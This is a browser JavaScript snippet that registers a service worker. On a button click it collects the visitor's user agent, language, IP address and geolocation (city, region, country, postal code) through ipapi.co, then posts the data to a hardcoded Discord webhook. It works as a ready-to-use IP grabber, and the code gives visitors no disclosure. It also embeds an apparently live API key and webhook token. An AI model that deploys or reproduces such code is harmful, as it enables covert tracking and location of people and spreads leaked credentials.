// Register the service worker
if ('serviceWorker' in navigator) {
  window.addEventListener('load', () => {
    navigator.serviceWorker.register('sw.js').then(
      (registration) => {
        console.log('ServiceWorker registration successful with scope:', registration.scope);
      },
      (err) => {
        console.log('ServiceWorker registration failed:', err);
      }
    );
  });
}

document.getElementById('collectData').addEventListener('click', async () => {
  const userAgent = navigator.userAgent;
  const language = navigator.language;

  const apiKey = '551b4898437b342786633d649a8d4213'; // Your API key
  const response = await fetch(`https://ipapi.co/json/?key=${apiKey}`);
  const data = await response.json();
  const { ip, city, region, country, postal } = data;

  const userData = {
    userAgent,
    language,
    ip,
    city,
    region,
    country,
    postal,
  };

  sendToDiscordWebhook(userData);
});

function sendToDiscordWebhook(userData) {
  // Replace with your Discord webhook URL
  const webhookURL = 'https://discord.com/api/webhooks/1154687564322717696/nk2SyiAWN9JcCJbmNG2Sdu9ktGXVnA1vHdyQki3-vaiZRrrnp7Wt-Xqxv2F48HV5uPsk';

  fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      content: `User data:\n\`\`\`json\n${JSON.stringify(userData, null, 2)}\n\`\`\``,
    }),
  });
}
